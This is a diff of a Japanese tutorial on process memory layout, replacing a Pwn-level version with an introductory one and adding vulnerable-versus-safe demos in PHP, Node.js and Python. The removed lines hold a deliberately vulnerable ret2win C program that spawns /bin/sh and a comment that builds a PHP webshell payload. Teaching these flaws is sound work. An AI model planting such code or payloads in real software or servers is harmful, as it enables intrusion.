@@ -1,827 +1,738 @@
 ---
 title: "メモリモデル完全理解 — スタック・ヒープ・BSS・テキスト"
 slug: "memory-model"
-field: "Pwn"
-level: "L2"
+field: "linux-basics"
+level: "L1"
 readMin: 20
-publishedAt: "2026-06-17"
-description: "プロセスのメモリ空間（スタック・ヒープ・BSS・テキスト）を図解し、スタックバッファオーバーフロー・use-after-free・heap spray の仕組みと防御策を体系的に解説する。Pwn / Binary Exploitation の必須前提知識。"
-heroImage: "/articles/memory-model/hero.png"
-tags: ["Pwn", "メモリ", "スタック", "ヒープ", "バッファオーバーフロー", "use-after-free", "Foundation", "Binary"]
-prerequisites: ["bitwise-basics", "linux-basics", "terminal-basics", "programming-basics", "assembly-basics", "c-basics", "gdb-basics"]
-relatedCves: ["CVE-2021-3156", "CVE-2022-0185"]
+publishedAt: "2026-06-18"
+description: "バッファオーバーフロー・ヒープ破壊・情報漏洩の土台となるプロセスメモリ構造を体系的に学ぶ。スタック・ヒープ・BSS・テキストの役割と境界を理解し、脆弱性がなぜ生まれるかを把握する。"
+tags: ["memory", "stack", "heap", "bss", "buffer-overflow", "linux-basics", "pwn"]
+prerequisites: ["linux-cli-basics", "binary-hex-bitops"]
+relatedCves: ["CVE-2021-3156", "CVE-2014-0160", "CVE-2023-0386"]
 ---
 
 ## TL;DR
 
-- プロセスのメモリ空間はテキスト・データ・BSS・ヒープ・スタックの5領域に分かれており、それぞれ役割と攻撃面が異なる。
-- スタックバッファオーバーフローはリターンアドレスを上書きして制御フローを奪い、use-after-free は解放済みメモリへのアクセスで任意コード実行につながる。
-- ASLR・Stack Canary・NX（DEP）・RELRO を組み合わせた多層防御が現代の標準だが、バイパス手法も存在するため原理の理解が不可欠だ。
+- プロセスのメモリは **テキスト・データ・BSS・ヒープ・スタック** の 5 領域に分かれており、それぞれ役割と境界がある。
+- **スタック** は関数呼び出しの記録場所で、古典的には境界を超えて書き込むと戻りアドレスを書き換えられる（現代環境では Stack Canary・ASLR・NX が防御する）。
+- **ヒープ** は動的に確保する領域で、管理ミスが Use-After-Free や Heap Overflow の原因になる。
 
 ---
 
 ## なぜ重要か
 
-「バッファオーバーフロー」という言葉は聞いたことがあっても、「なぜ起きるのか」「なぜ任意コード実行になるのか」をメモリの構造から説明できる人は意外と少ない。
+セキュリティエンジニアが「メモリの構造」を知らないと、脆弱性レポートに書かれた次のような文章を理解できない。
 
-HTB の Pwn カテゴリや OffSec PEN-200 のバッファオーバーフロー演習で最初につまずくのも、ほぼ必ずこの「メモリモデルの理解不足」だ。スタックがどの方向に伸びるか、ヒープとスタックの違いは何か、リターンアドレスはスタックのどこにあるか——これを知らずに pwntools を動かしても、何をやっているか理解できないまま終わる。
+```
+stack-based buffer overflow in function process_input()
+heap use-after-free in libssl
+BSS segment overwrite via uninitialized global
+```
 
+メモリモデルを知ることで：
 
-さらに Web の世界でも、PHP の `unserialize()` や Node.js の `Buffer.allocUnsafe()` のように、**メモリ由来のAPIや安全でないデシリアライゼーションが攻撃面になる**ケースがある。C レベルのメモリモデルとは別階層の話だが、根底にある「メモリ上のデータをどう扱うか」という思考は共通だ。
+| 知識 | 活用場面 |
+|------|----------|
+| スタックの構造 | バッファオーバーフローの原因理解 |
+| ヒープの仕組み | Use-After-Free / Heap Spray の理解 |
+| BSS / データ領域 | グローバル変数汚染の理解 |
+| テキスト領域 | コード注入・ROP チェーンの前提知識 |
+| 領域ごとのアクセス権 | セグメンテーションフォルトの読み方 |
 
-
-2026年現在、Linux カーネル・ブラウザ・IoT ファームウェアの大部分は依然として C/C++ で書かれており、メモリ安全性の問題は現役の攻撃対象だ。一方で Rust や Go といるメモリ安全言語への移行も加速しており、「なぜ移行が必要か」を理解するためにも本記事の知識は必須だ。
-
-> ⚠️ **法的注意**: 本記事の攻撃手法はすべて **自分が管理するシステム**、または **規約・契約で明示的に許可された演習環境**（HTB / TryHackMe / 自宅 VM / Bug Bounty 対象スコープ内）でのみ実施してください。許可なく他者のシステムへ試みることは **不正アクセス禁止法（日本）** 違反となり、刑事罰の対象です。
+この記事で「なぜその脆弱性が起きるか」を構造レベルで説明できるようになる。
 
 ---
 
 ## 仕組み
 
-## Mermaid 図
+### 1. プロセスメモリの全体像
 
-
-### 挿入図: プロセスメモリの種類分類
-
-```mermaid
-flowchart TD
-    A[プロセスの仮想メモリ] --> B[テキスト領域: コード]
-    A --> C[データ領域]
-    A --> D[BSS領域]
-    A --> E[ヒープ: malloc/new]
-    A --> F[スタック: 関数呼び出し]
-    E --> G[UAF / Double Free]
-    F --> H[Stack BOF]
-    B --> I[ROP / ret2libc]
-```
-
-### 挿入図: Stack BOF の攻撃フロー
-
-```mermaid
-sequenceDiagram
-    actor A as 攻撃者
-    participant P as 脆弱プログラム
-    participant S as スタック
-    participant C as 制御フロー
-    participant W as win関数
-
-    A->>P: 長すぎる入力を送信
-    P->>S: buf[64] を超えて書き込み
-    S->>S: Return Address を上書き
-    S-->>C: RIP が攻撃者指定アドレスへ
-    C->>W: win() にジャンプ
-    W-->>A: シェル取得
-```
-
-### 挿入図: 演習ネットワーク構成
-
-```mermaid
-graph TD
-    A[自宅VM / HTB / TryHackMe] --> B[脆弱バイナリ]
-    B --> C[checksec]
-    B --> D[gdb / pwndbg]
-    B --> E[pwntools]
-    C --> F[保護機構を確認]
-    D --> G[RIP / RSPを観察]
-    E --> H[payload作成]
-    H --> I[ret2win演習]
-```
-
-### 挿入図: 防御策の分類
+Linux でプログラムを起動すると、カーネルがプロセスに **仮想アドレス空間** を割り当てる。その内部は以下の 5 つの領域に分かれている。
 
 ```mermaid
 flowchart TD
-    A[防御策] --> B[安全なAPI]
-    A --> C[コンパイラ保護]
-    A --> D[OS保護]
-    A --> E[検出]
-    A --> F[設計改善]
-    B --> G[snprintf / Buffer.alloc]
-    C --> H[Canary / PIE / RELRO]
-    D --> I[ASLR / NX]
-    E --> J[ASan / Valgrind / Fuzzing]
-    F --> K[Rust / 所有権設計]
+    HIGH["高位アドレス"]
+    STACK["スタック領域
+関数の局所変数・戻りアドレス
+成長方向: 低位へ"]
+    GAP["未使用領域 / ASLR gap"]
+    HEAP["ヒープ領域
+malloc / new で動的確保
+成長方向: 高位へ"]
+    BSS["BSS セグメント
+未初期化グローバル変数
+実行時に 0 で初期化"]
+    DATA["データセグメント
+初期化済みグローバル変数"]
+    TEXT["テキストセグメント
+実行コード read-only
+PIE/ASLR でアドレスは実行ごとに変化"]
+    LOW["低位アドレス"]
+
+    HIGH --> STACK --> GAP --> HEAP --> BSS --> DATA --> TEXT --> LOW
 ```
-
-
-### プロセスのメモリマップ
-
-Linux 上でプロセスが起動すると、仮想アドレス空間が以下のように分割される（x86-64 の典型的なレイアウト）。
-
-
-```
-高位アドレス (0xFFFF...)
-┌─────────────────────────────┐
-│         カーネル空間         │  ← ユーザーはアクセス不可
-├─────────────────────────────┤
-│      [vvar] / [vdso]        │  ← カーネル提供の高速システムコール
-├─────────────────────────────┤
-│          スタック            │  ← 下方向に伸びる ↓
-│    (関数呼び出し・ローカル変数) │
-├─────────────────────────────┤
-│            ↓                │
-│     [mmap / 共有ライブラリ]  │  ← libc.so, ld.so など（ASLR でランダム化）
-│            ↑                │
-├─────────────────────────────┤
-│           ヒープ             │  ← 上方向に伸びる ↑
-│     (動的確保: malloc/new)   │
-├─────────────────────────────┤
-│            BSS              │  ← 未初期化グローバル変数
-├─────────────────────────────┤
-│           データ             │  ← 初期化済みグローバル変数
-├─────────────────────────────┤
-│    テキスト（コード）         │  ← 実行可能な機械語（r-xp）
-低位アドレス (0x0000...)
-```
-
-![プロセスのメモリマップ](./images/1.png)
-
-各領域の役割を把握することが、すべての攻撃手法を理解する出発点になる。
-
-
-### 仮想メモリとページ権限（r/w/x）
-
-OS は物理メモリを **ページ**（通常 4KB）単位で管理し、各ページに `r`（読み取り）・`w`（書き込み）・`x`（実行）の権限を付与する。`/proc/<PID>/maps` で各領域の権限を確認できる。
-
-```
-7f8a00000000-7f8a00021000 r-xp  /lib/x86_64-linux-gnu/libc.so.6  ← 実行可能
-7f8a00021000-7f8a00221000 ---p  (guard page)
-7f8a00221000-7f8a00225000 r--p  /lib/x86_64-linux-gnu/libc.so.6  ← 読み取りのみ
-7f8a00225000-7f8a00227000 rw-p  /lib/x86_64-linux-gnu/libc.so.6  ← 読み書き可
-7ffcf3a00000-7ffcf3a21000 rw-p  [stack]                          ← 読み書き可（実行不可）
-```
-
-**W^X 原則**: 書き込み可（w）と実行可（x）を同時に許可しないことが現代のセキュリティ基本方針だ。NX/DEP はこの原則をハードウェア/OS レベルで強制する。
-
-### テキスト領域（コードセグメント）
-
-コンパイルされた機械語命令が格納される。ページ権限は **`r-xp`（読み取り・実行のみ、書き込み不可）**。
-
-
-テキスト領域はページ権限により書き込みが禁止されており、攻撃者が直接書き換えることは通常できない。コード注入攻撃（シェルコード）はスタック・ヒープなどのデータ領域にコードを置いて実行させる手法で、これを阻止するのが NX/DEP だ。
-
-### データ・BSS 領域
-
-- **データ**: 初期化済みのグローバル変数・静的変数（`static int x = 5;` など）
-- **BSS**: 未初期化のグローバル変数（プログラム起動時にゼロ初期化される）
-
-どちらもプログラムの開始から終了まで生存する。スタックやヒープと違い、確保・解放の概念がない。
-
-### スタック — 攻撃面 ★★★
-
-関数呼び出しのたびに **スタックフレーム** が積まれる。フレームには次の要素が並ぶ。
-
 
 ```
 高位アドレス
-┌────────────────────────────┐
-│  引数（7個目以降のみスタック）│  ← x86-64 SysV: 最初の6引数はレジスタ渡し
-│  (RDI, RSI, RDX, RCX, R8, R9) ← ← 6つまではレジスタ
-├────────────────────────────┤
-│   リターンアドレス (RIP/EIP) │  ← ここを上書きすると制御フロー奪取！
-├────────────────────────────┤
-│    保存済みベースポインタ    │
-├────────────────────────────┤
-│    ローカル変数・バッファ    │  ← バッファはここに確保
-低位アドレス                       スタックは下方向↓に伸びる
+┌──────────────────────────┐
+│        スタック          │ ← 関数呼び出しのたびに成長（低位方向）
+├──────────────────────────┤
+│    （未使用領域 / MMAP）  │
+├──────────────────────────┤
+│        ヒープ            │ ← malloc で動的確保（高位方向に成長）
+├──────────────────────────┤
+│     BSS セグメント       │ ← 未初期化グローバル変数（実行時に 0）
+├──────────────────────────┤
+│    データセグメント       │ ← 初期化済みグローバル変数
+├──────────────────────────┤
+│    テキストセグメント     │ ← 実行コード（read-only）
+└──────────────────────────┘
+低位アドレス
 ```
 
+実際のアドレスは `/proc/[PID]/maps` で確認できる。
 
-**重要**: スタックは高位→低位方向に伸びるが、典型的な C 配列では `buf[0]` から高位側へ連続して書かれる。そのため、バッファをあふれさせると隣接する **リターンアドレスを上書き** できる。これがスタックバッファオーバーフローの本質だ。
-
-
-> **エンディアンと payload**: x86-64 はリトルエンディアン。`win()` のアドレスが `0x401152` の場合、メモリ上では `52 11 40 00 00 00 00 00` の順に並ぶ。pwntools の `p64(0x401152)` はこのリトルエンディアン変換を自動で行う。
-
-### ヒープ — 攻撃面 ★★★
-
-`malloc()` / `new` / `free()` で動的に管理されるメモリ領域。確保と解放のライフサイクルをプログラマが制御する。
-
-ヒープ管理はアロケータ（glibc の ptmalloc2 など）が担い、確保したブロックはヘッダ情報（サイズ・フラグ）と隣接して配置される。
-
-**use-after-free（UAF）**: `free()` した後もポインタを使い続けると、解放済みチャンクを別の用途で再利用されたとき、意図しないデータを読み書きできる。
-
-
-**heap spray**: 大量の確保・解放を繰り返して特定のアドレスに意図したデータを配置するテクニック。主にブラウザ exploit で使われる手法だ。
-
-**現代の glibc ヒープ（tcache / fastbin）**: glibc 2.26 以降では **tcache**（スレッドローカルキャッシュ）が導入された。`free()` した小さなチャンクは tcache に入り、次の `malloc()` で再利用される。**tcache poisoning** はこの fd ポインタを書き換えて任意アドレスの確保を誘発する現代的な heap exploit 手法だ。また glibc 2.32 以降では **Safe-Linking** が導入され、tcache/fastbin の fd ポインタが難読化されている。
-
-![スタックとヒープの構造比較](./images/2.png)
-
-### 現代の緩和機構
-
-
-| 機構 | 効果 | バイパス例 |
-|---|---|---|
-| **ASLR** | スタック・ヒープ・ライブラリのアドレスをランダム化 | 情報リーク + ret2libc |
-| **Stack Canary** | リターンアドレス前に乱数を置いて改ざん検知 | Canary リーク + 上書き |
-| **NX / DEP** | スタック・ヒープを実行不可にしてシェルコード阻止 | ROP (Return Oriented Programming) |
-| **RELRO** | GOT 領域を読み取り専用にして上書きを防ぐ | Partial RELRO は Full より弱い |
-| **PIE** | テキスト領域もランダム化 | テキスト内アドレスのリークが必要 |
-| **Safe-Linking** *(発展)* | tcache/fastbin fd ポインタを難読化 | ヒープアドレスリークで解除可能 |
-| **CET / Shadow Stack** *(発展)* | ハードウェアレベルでリターンアドレスを保護 | 対応 CPU が必要（Intel 第10世代以降） |
-| **PAC / MTE** *(発展)* | ARM: ポインタ認証 / メモリタグで UAF 検出 | ARM64 環境（Apple Silicon, Android） |
-
----
-
-## 脆弱なコード例（C / PHP / Node.js / Python）
-
-
-
-### C — スタックバッファオーバーフロー（概念の原点）
-
-
-```c
-// ❌ 脆弱なコード — スタックBOFの古典的パターン（stdin 読み取り型）
-// コンパイル: gcc -o vuln vuln.c -fno-stack-protector -no-pie
-// ※ ret2win 例では -z execstack は不要（シェルコード練習時のみ使用）
-#include <stdio.h>
-#include <string.h>
-#include <stdlib.h>  // 
-
-void win() {
-    // 攻撃者が実行させたい関数
-    printf("shell 奪取成功！\n");
-    system("/bin/sh");
-}
-
-void vulnerable() {
-    char buf[64];  // スタック上に 64 バイトのバッファを確保
-    // ❌ gets は境界チェックなし。64 バイト超えを入力するとリターンアドレスまで上書き
-    gets(buf);     // stdin から読み取り（pwntools の sendline と対応）
-    printf("入力: %s\n", buf);
-}
-
-int main() {
-    vulnerable();
-    return 0;
-}
-// 攻撃手順:
-// 1. nm ./vuln | grep win  → win() のアドレスを確認（例: 0000000000401152）
-// 2. pwntools で p64(win_addr) をペイロードに組み込む（後述の exploit.py 参照）
-// 3. 64bit では RIP は 8バイト。p64() が正しいリトルエンディアン変換を行う
+```bash
+# 自分のシェルプロセスのメモリマップを見る
+cat /proc/$$/maps | head -20
 ```
 
 ---
 
+### 2. テキストセグメント（`.text`）
 
-### PHP — unserialize() による PHP Object Injection
+**役割**: コンパイル済みの機械語命令列を格納する。
+
+- アクセス権: **read + execute のみ**（書き込み不可）
+- なぜ read-only か: 実行中のコードを自分自身が書き換えないようにする保護
+- `NX bit`（No-eXecute）でスタック/ヒープの実行を防ぐ現代のセキュリティ機構はここに起源がある
+- **PIE（Position Independent Executable）と ASLR が有効な場合、テキストセグメントのアドレスも実行ごとにランダム化される**。静的なアドレスを前提にした攻撃はこれにより困難になる
+
+```bash
+# ELF バイナリのセクション情報を確認
+readelf -S /bin/ls | grep -E '\.text|\.rodata'
+# → .text  PROGBITS  ... AX（Allocate + eXecute）
+```
+
+---
+
+### 3. データセグメント（`.data`） と BSS（`.bss`）
+
+| 領域 | 内容 | 例 |
+|------|------|-----|
+| `.data` | **初期化済み**グローバル変数・静的変数 | `int g = 42;` |
+| `.bss` | **未初期化**グローバル変数・静的変数 | `int g;`（実行時に 0） |
+
+BSS は "Block Started by Symbol" の略。バイナリサイズを削減するため、未初期化変数の実際の 0 値はバイナリに埋め込まず、ローダーが実行時に書き込む。
+
+セキュリティ上の注意点: **未初期化変数を初期値 0 だと思い込んだコードが、初期化忘れによりゴミ値を読むバグ** は C/C++ で頻出。
+
+---
+
+### 4. ヒープ（Heap）
+
+**役割**: 実行時に動的確保するメモリ領域。`malloc` / `new` / `mmap` がここに確保する。
+
+- ヒープは **低位 → 高位方向** に成長する
+- 解放（`free`）した領域は再利用される → **断片化**が起きる
+- 管理は `glibc` の `ptmalloc2`（Linux）が担う
+
+重要な概念：
+
+```
+確保: malloc(n) → ヒープ上にチャンクを割り当て、ポインタを返す
+解放: free(ptr) → チャンクを解放リストに戻す
+問題: free 後にポインタを使い続ける → Use-After-Free（発展）
+     同じポインタを 2 回 free → Double-Free（発展）
+     割り当てサイズを超えて書き込む → Heap Overflow（発展）
+```
+
+これらの攻撃手法の詳細は後続の「ヒープ攻撃入門」で扱う。
+
+---
+
+### 5. スタック（Stack）
+
+**役割**: 関数呼び出しの情報（戻りアドレス・局所変数・引数）を積み重ねる領域。
+
+- スタックは **高位 → 低位方向** に成長する（ヒープと逆）
+- 関数を呼ぶたびに **スタックフレーム** が積まれ、return で取り除かれる
+
+```mermaid
+flowchart TD
+    TOP["高位アドレス（呼び出し元フレーム）"]
+    RET["戻りアドレス RIP/EIP
+古典的にはここを書き換えると制御を奪える
+現代では Stack Canary が検出する"]
+    SBP["保存されたベースポインタ RBP"]
+    BUF["局所変数 / バッファ
+例: char buf[64]"]
+    ARGS["引数"]
+    BOTTOM["低位アドレス（スタック成長方向）"]
+
+    TOP --> RET --> SBP --> BUF --> ARGS --> BOTTOM
+```
+
+スタックフレームの構造（x86-64 の例）：
+
+```
+高位アドレス
+┌────────────────┐ ← 呼び出し元のスタックフレーム
+│  戻りアドレス   │ ← return 後にジャンプする先（RIP）
+│  保存 RBP      │ ← 呼び出し元のベースポインタ
+│  局所変数      │ ← char buf[64] などがここに置かれる
+│  （パディング） │
+└────────────────┘ ← 呼び出し先の RSP（スタックポインタ）
+低位アドレス
+```
+
+**バッファオーバーフローの原因**: `buf[64]` に 65 バイト以上書き込むと、上位にある戻りアドレスを上書きできる。これがスタックベースのバッファオーバーフローだ。詳細は後続の「バッファオーバーフロー入門」で扱う。
+
+---
+
+## 脆弱なコード例（PHP / Node.js / Python）
+
+### PHP — `extract()` による変数注入（グローバル変数汚染の概念）
+
+> **C の .bss との関係**: C では未初期化グローバル変数が `.bss` セグメントに置かれ実行時に 0 で埋められる。PHP の変数モデルは C と別概念だが、「初期化されていない変数をそのまま権限判定に使う」という設計ミスは共通のアンチパターンだ。以下は PHP で **実際に認証バイパスが成立する**具体例を示す。
 
 ```php
 <?php
-// ❌ 脆弱なコード — 信頼できない入力を unserialize() に渡す
+/**
+ * 脆弱なコード例: extract() による変数注入
+ *
+ * PHP の extract() は連想配列のキーをそのまま変数名として展開する。
+ * 外部入力をそのまま渡すと、攻撃者が任意の変数を上書きできる。
+ * 実際に PHP アプリで発見されてきた認証バイパスパターン。
+ *
+ * 注意: 未定義変数参照は PHP 8.x で Warning を発生させる。
+ *       文脈によって null 相当として扱われることがあるが、
+ *       それ自体を脆弱性として利用する方法は extract() 等の方が典型的。
+ */
 
-class FileLogger {
-    public string $logFile = '/var/log/app.log';
-    
-    public string $message = "Session ended\n";
+// ❌ 脆弱: $_GET / $_POST を extract() に直接渡している
+function auth_vulnerable(array $params): string {
+    $is_admin = false;  // 安全な初期値のつもり
 
-    // デストラクタ: オブジェクトが GC で回収されるとき自動呼び出し
-    public function __destruct() {
-        // ❌ 問題: logFile と message が攻撃者に制御されると任意ファイルへの任意書き込みが可能
-        file_put_contents($this->logFile, $this->message, FILE_APPEND);
+    // extract() は $params のキーをそのまま変数名に展開する
+    // 攻撃者が $params["is_admin"] = true を渡すと $is_admin が上書きされる
+    extract($params);   // ← これが問題
+
+    if ($is_admin) {
+        return "管理者パネルへようこそ";
     }
+    return "一般ユーザー";
 }
 
-class Config {
-    public string $dbHost = 'localhost';
-    public string $dbPass = 'secret';
+// 正常なリクエスト
+echo auth_vulnerable(["username" => "alice"]) . "\n";
+// → 一般ユーザー
+
+// 攻撃: is_admin=true を注入（GETパラメータ ?is_admin=1 相当）
+echo auth_vulnerable(["username" => "eve", "is_admin" => true]) . "\n";
+// → 管理者パネルへようこそ  ← バイパス成立
+
+// ✅ 安全: extract() を使わず、必要なキーだけ明示的に取り出す
+function auth_safe(array $params): string {
+    $is_admin = false;  // 必ず初期化
+    $username = $params["username"] ?? "anonymous";  // キーを明示指定
+
+    // is_admin は外部入力から絶対に受け取らない
+    // 必要なら DB から取得してセット
+    if ($username === "alice_admin") {
+        $is_admin = true;
+    }
+
+    if ($is_admin) {
+        return "管理者パネルへようこそ";
+    }
+    return "一般ユーザー";
 }
 
-// ❌ Cookie やリクエストパラメータの値を直接 unserialize
-$data = base64_decode($_COOKIE['session'] ?? '');
-$obj  = unserialize($data);  // 攻撃者が細工したシリアル化データを渡せる
-
-// 攻撃シナリオ（PHP Object Injection）:
-// 1. FileLogger オブジェクトを細工して logFile と message を上書き
-// 2. __destruct が呼ばれると任意パスに任意内容を書き込める → WebShell 設置
-//
-// 攻撃ペイロード生成（PHP）:
-// $evil = new FileLogger();
-// $evil->logFile    = '/var/www/html/shell.php';
-// $evil->message    = '<?php system($_GET["cmd"]); ?>';
-// echo base64_encode(serialize($evil));
+echo auth_safe(["username" => "alice_admin"]) . "\n";  // → 管理者パネルへようこそ
+echo auth_safe(["username" => "eve", "is_admin" => true]) . "\n";  // → 一般ユーザー
 ?>
 ```
 
+> **なぜこうなるか**: `extract()` は「配列のキー名 = 変数名」として展開するため、攻撃者が `is_admin` というキーを送れば既存の変数を上書きできる。同様のパターンが `$$varname`（可変変数）にも存在する。`extract()` への外部入力は PHP セキュリティの古典的禁忌だ。
+
 ---
 
-### Node.js — Buffer.allocUnsafe() による未初期化メモリ露出
+### Node.js — ヒープ上の未初期化バッファによる情報漏洩
 
 ```javascript
-// ❌ 脆弱なコード — allocUnsafe で未初期化メモリを HTTP レスポンスに含める
+/**
+ * 脆弱なコード例: Buffer.allocUnsafe() による情報漏洩
+ *
+ * Node.js の Buffer.allocUnsafe(n) はヒープ上の未初期化領域を返す。
+ * 以前のプロセスデータ（パスワード・トークン等）が混入する可能性がある。
+ * これが safe-buffer パッケージが生まれた背景。
+ *
+ * Heartbleed (CVE-2014-0160) との概念的な共通点:
+ *   「長さ検証なしに他の領域のメモリを読み取れる」という設計ミス。
+ *   ただし Node.js の Buffer API 自体は境界チェックを行うため、
+ *   以下は「未初期化領域がそのまま返る」という別種の情報漏洩を示す。
+ */
 
-const http = require('http');
-
-http.createServer((req, res) => {
-    const url = new URL(req.url, 'http://localhost');
-    
-    const size = parseInt(url.searchParams.get('size') || '64');
-    // ❌ 問題1: parseInt("abc") = NaN、負数、極端な値も通過する
-    // ❌ 問題2: NaN を渡すと Buffer.allocUnsafe(NaN) → 0バイト Buffer または例外
-    // ❌ 問題3: 上限チェックがないため巨大サイズで DoS にもなりうる
-    // Number.isSafeInteger(size) && size > 0 の検証が必要
-
-    // ❌ 問題4: Buffer.allocUnsafe はゼロ埋めしない
-    // Node.js のヒープ上にある前の処理で使ったメモリが入る可能性がある
-    
-    // ※ 実際の漏洩内容は Node.js バージョン・実行条件・Buffer pool の状態に依存する
+// ❌ 脆弱: allocUnsafe はヒープの未初期化領域をそのまま返す
+function createResponse_vulnerable(size) {
+    // 初期化されていない → 直前にヒープを使っていたデータが残っている可能性
     const buf = Buffer.allocUnsafe(size);
+    return buf;
+}
 
-    res.writeHead(200, { 'Content-Type': 'application/octet-stream' });
-    res.end(buf);  // 未初期化のヒープデータをそのまま送信
-}).listen(3000);
+// ✅ 安全: alloc はゼロ初期化してから返す
+function createResponse_safe(size) {
+    const buf = Buffer.alloc(size);  // 0x00 で埋めてから返す
+    return buf;
+}
 
-// 攻撃: curl http://target:3000/?size=65536
-// → ヒープ上の残留データが漏洩する可能性（再現性は実行環境に依存）
+// デモ: 未初期化バッファの内容を確認
+const secret = Buffer.from("TOP_SECRET_TOKEN");  // ヒープ上に配置
+secret.fill(0);  // 使い終わったつもりでゼロ埋め
+
+const leaked = createResponse_vulnerable(16);
+const safe   = createResponse_safe(16);
+
+console.log("allocUnsafe (hex):", leaked.toString('hex'));
+// → ゼロの場合も多いが、実行環境によっては残存データが含まれる
+console.log("alloc       (hex):", safe.toString('hex'));
+// → 0000000000000000000000000000000000000000（保証された安全）
+
+// 長さ検証の重要性（Heartbleed の概念的なデモ）
+function heartbeat_concept(payload, requestedLength) {
+    // Node.js の Buffer.copy は境界チェックを行うため
+    // 実際には payload 範囲外のメモリは読まれない（ゼロ埋めになる）
+    // これは「Node.js は安全」という意味ではなく、
+    // 「C では起きる問題が高レベル言語では別の形で現れる」ことを示すためのデモ
+    const safeLength = Math.min(requestedLength, payload.length);  // ← 正しい対処
+    const response = Buffer.alloc(requestedLength);  // ゼロ初期化
+    payload.copy(response, 0, 0, safeLength);        // safeLength 分だけコピー
+    return response;
+}
+
+const payload  = Buffer.from("PING");
+const response = heartbeat_concept(payload, 64);
+// 不足分は 0x00 埋め（C の実装では隣接メモリが漏れる可能性がある）
+console.log("response (hex):", response.toString('hex'));
+
+// ヒープ使用量の確認
+const mem = process.memoryUsage();
+console.log(`heap used: ${(mem.heapUsed / 1024).toFixed(0)} KB`);
+console.log(`heap total: ${(mem.heapTotal / 1024).toFixed(0)} KB`);
 ```
 
+> **なぜこうなるか**: `Buffer.allocUnsafe()` はパフォーマンスのためゼロ初期化をスキップする。OS がプロセスに割り当てたヒープ領域には直前の操作で使ったデータが残っていることがあり、それがそのまま返ってしまう。Node.js は境界チェックを行うため C の Heartbleed と完全に同じ挙動ではないが、未初期化データが露出するという点で同種のリスクだ。
+
+---
+
+### Python — スタック深度の枯渇と UAF コンセプト
 
 ```python
-# Python でも C 拡張 / ctypes 経由では未初期化メモリを扱える（概念例）
-import ctypes
+#!/usr/bin/env python3
+"""
+脆弱なコード例 + 安全なコード例:
+再帰によるスタック枯渇と、その防御策
 
-# 高水準言語でも低レイヤーAPIを誤用すると C と同じ問題が起きる
-libc = ctypes.CDLL("libc.so.6")
-libc.malloc.restype = ctypes.c_void_p
+スタックフレームは有限。際限なく積み上げると
+CPython は通常 RecursionError を送出して停止する。
+極端なケース（C 拡張・OS のスタックサイズ設定）では
+SIGSEGV でクラッシュする可能性もある。
+"""
+import sys
 
-ptr = libc.malloc(64)  # ゼロ埋めなし — ヒープの残留データが入る可能性
-# ← ここから読んだデータを外部に送ると情報漏洩リスク
+# ─────────────────────────────────────────────
+# ❌ 脆弱: 入力値で再帰深度を制御できる関数
+# ─────────────────────────────────────────────
 
-libc.free(ptr)  # 解放を忘れると UAF / メモリリークの原因になる
-# 通常の Python コードでは ctypes.malloc を直接呼ぶ必要はない。
-# 標準ライブラリ・bytearray・bytes を使うこと。
+def vulnerable_recursive(n: int) -> int:
+    """
+    攻撃者が n に巨大な値を渡すとスタックを枯渇させられる。
+    サービス拒否（DoS）攻撃の典型パターン。
+    """
+    if n <= 0:
+        return 0
+    # スタックフレームが積み重なり続ける
+    return n + vulnerable_recursive(n - 1)
+
+# ─────────────────────────────────────────────
+# ✅ 安全: 再帰深度を上限で制限する
+# ─────────────────────────────────────────────
+
+MAX_DEPTH = 500  # 安全な上限（sys.getrecursionlimit() = 1000 の半分以下）
+
+def safe_recursive(n: int, depth: int = 0) -> int:
+    """
+    depth カウンターで再帰深度を監視し、
+    上限を超えたら例外を送出して安全に停止する。
+    """
+    if depth > MAX_DEPTH:
+        raise RecursionError(f"深度上限 {MAX_DEPTH} を超えました: n={n}")
+    if n <= 0:
+        return 0
+    return n + safe_recursive(n - 1, depth + 1)
+
+
+# ─────────────────────────────────────────────
+# メモリレイアウトの観察（教育用）
+# ─────────────────────────────────────────────
+
+def show_memory_layout():
+    """
+    Python オブジェクトのアドレスを観察してメモリ配置を理解する。
+
+    注意: CPython では id() は実装上メモリアドレスに近い値を返すが、
+    Python 言語仕様としては保証されていない。実装依存の動作。
+    また CPython のオブジェクトはすべてヒープ上に配置される。
+    C の .data/.bss との対応はあくまで「概念的な比較」として捉えること。
+    """
+    # モジュールレベルのオブジェクト（概念上「グローバル」相当、実体はヒープ）
+    GLOBAL_VAR = 0xCAFEBABE
+
+    # スタックフレームから参照されるオブジェクト（実体はヒープ上）
+    local_a = bytearray(8)
+    local_b = bytearray(8)
+
+    # ヒープ上のオブジェクト（明示的に大きく確保）
+    heap_obj = bytearray(1024)
+
+    print(f"GLOBAL_VAR id (概念的参照値): {hex(id(GLOBAL_VAR))}")
+    print(f"local_a id   (概念的参照値): {hex(id(local_a))}")
+    print(f"local_b id   (概念的参照値): {hex(id(local_b))}")
+    print(f"heap_obj id  (概念的参照値): {hex(id(heap_obj))}")
+    print(f"  ※ id() は CPython 実装依存。言語仕様での保証なし")
+    print(f"\nrecursion limit : {sys.getrecursionlimit()}")
+
+    import traceback
+    depth = len(traceback.extract_stack())
+    print(f"current stack depth: {depth}")
+
+
+# ─────────────────────────────────────────────
+# Use-After-Free の概念（Python での安全なデモ）
+# ─────────────────────────────────────────────
+
+def uaf_concept_demo():
+    """
+    Python では GC があるため本物の UAF は起きないが、
+    C 相当の「解放済みポインタへのアクセス」の概念を示す。
+    """
+    class Node:
+        def __init__(self, secret: str):
+            self.secret = secret
+
+    obj = Node("PASSWORD_123")
+    obj_id = id(obj)
+    print(f"[+] 確保: Node at {hex(obj_id)}, secret={obj.secret}")
+
+    del obj  # 解放（C の free 相当）
+
+    # Python では del 後に同名変数でアクセスすると NameError
+    try:
+        print(obj.secret)  # type: ignore
+    except NameError:
+        print("[!] Python は解放済み変数へのアクセスを NameError で防ぐ")
+
+    print("→ C/C++ では同アドレスに別データが入り、機密情報が読める可能性がある")
+
+
+if __name__ == "__main__":
+    print("=== メモリレイアウト観察 ===")
+    show_memory_layout()
+
+    print("\n=== 再帰深度テスト ===")
+    try:
+        result = safe_recursive(600)  # 上限 500 を超える
+    except RecursionError as e:
+        print(f"[!] 安全に停止: {e}")
+
+    result = safe_recursive(100)  # 安全な範囲
+    print(f"[+] safe_recursive(100) = {result}")
+
+    print("\n=== UAF コンセプトデモ ===")
+    uaf_concept_demo()
 ```
 
 ---
 
-## 攻撃手順（合法ラボ環境での実演）
+## 実践例 / 演習例
 
-> 以下は **HTB / TryHackMe / 自宅 VM** など許可された環境での手順です。
